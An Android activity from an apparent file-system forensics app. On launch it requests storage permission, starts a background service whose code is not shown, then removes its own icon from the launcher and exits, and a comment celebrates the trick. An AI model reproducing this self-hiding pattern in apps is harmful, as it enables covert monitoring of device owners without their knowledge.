package ulisse.filesystemforensics;


import android.Manifest;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.os.Environment;
import android.support.annotation.MainThread;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.security.MessageDigest;
import java.sql.Date;
import java.text.DateFormat;

public class MainActivity extends Activity {

    private static final int REQUEST_PATH = 1;
    private static final int MY_PERMISSIONS_REQUEST_READ_CONTACTS = 0;
    private TextView txt;
    String curFileName;
    EditText edittext;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
       setContentView(R.layout.activity_main);
/*
        txt = (TextView) findViewById(R.id.textview);
        txt.setMovementMethod(new ScrollingMovementMethod());
        txt.setText("aòksjdbvpiawejbgvpawebgqwebgjqewh");*/

        // La cosa più importante dell'universo da Marshmallow in poi a quanto pare
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, MY_PERMISSIONS_REQUEST_READ_CONTACTS);

        Intent intent = new Intent(this, MyIntentService.class);
        startService(intent);

        // serve a far sparire da menù e chiudere app .. FUNZIONA!!!
        PackageManager p = getPackageManager();
        p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        finish();


        //
    }

}